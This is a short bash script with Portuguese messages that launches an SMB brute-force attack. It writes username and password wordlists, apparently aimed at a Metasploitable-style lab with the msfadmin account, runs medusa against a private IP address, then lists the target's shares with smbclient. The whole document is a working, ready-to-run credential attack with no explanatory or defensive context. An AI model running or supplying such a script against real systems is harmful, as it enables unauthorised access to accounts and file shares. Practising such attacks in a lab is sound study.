            #!/bin/bash
            echo "[+] Iniciando ataque SMB..."
            TARGET="192.168.1.18"

            echo "[+] Criando wordlists específicas para SMB..."
            echo -e "user
msfadmin
service" > ../wordlists/smb_users.txt
            echo -e "password
123456
Welcome123
msfadmin" > ../wordlists/senhas_spray.txt

            echo "[+] Executando força bruta SMB..."
            medusa -h $TARGET -U ../wordlists/smb_users.txt -P ../wordlists/senhas_spray.txt -M smbnt -t 2 -T

            echo "[+] Testando acesso com credenciais válidas..."
            smbclient -L //$TARGET -U msfadmin

            echo "[+] Ataque SMB concluído!"
